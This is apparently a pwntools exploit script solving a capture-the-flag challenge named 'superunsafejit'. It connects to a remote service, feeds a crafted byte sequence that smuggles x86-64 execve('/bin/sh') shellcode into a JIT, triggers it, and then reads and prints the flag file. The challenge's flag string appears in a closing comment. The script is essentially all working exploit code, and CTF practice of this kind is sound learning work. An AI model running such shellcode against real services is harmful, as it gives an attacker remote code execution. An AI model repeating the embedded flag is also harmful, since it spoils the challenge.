#!/usr/bin/env python3

from pwn import *

#p = process('./dist/chal')
#p = remote('127.0.0.1', 12345)
p = remote('175.123.252.15', 8888)

payload = bytes([
    0x00, 0x01, 0x00, 0x00, 0xf0, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x31, 0xd2, 0x31, 0xf6,
    0x02, 0x00, 0x00, 0x01, 0x00, 0x20, 0x01,
    0x00, 0x00, 0x00, 0x56, 0x48, 0xbb, 0x2f,
    0x02, 0x00, 0x00, 0x01, 0x00, 0x24, 0x01,
    0x00, 0x00, 0x00, 0x62, 0x69, 0x6e, 0x2f,
    0x02, 0x00, 0x00, 0x01, 0x00, 0x28, 0x01,
    0x00, 0x00, 0x00, 0x2f, 0x73, 0x68, 0x53,
    0x02, 0x00, 0x00, 0x01, 0x00, 0x2c, 0x01,
    0x00, 0x00, 0x00, 0x54, 0x5f, 0xb0, 0x3b,
    0x02, 0x00, 0x00, 0x01, 0x00, 0x30, 0x01,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x90, 0x90,
    0x02, 0x00, 0x00, 0x01, 0x00, 0x34, 0x01,
]).hex()

for i in range(4):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('>> ', payload)

p.sendlineafter('>> ', '2')
p.sendlineafter('>> ', '3')
p.sendline('cat /home/superunsafejit/flag')
print(p.readline())

# WACon{this_chal_has_nothing_to_do_with_compilers_because_i_wanted_it_to_be_ezpz}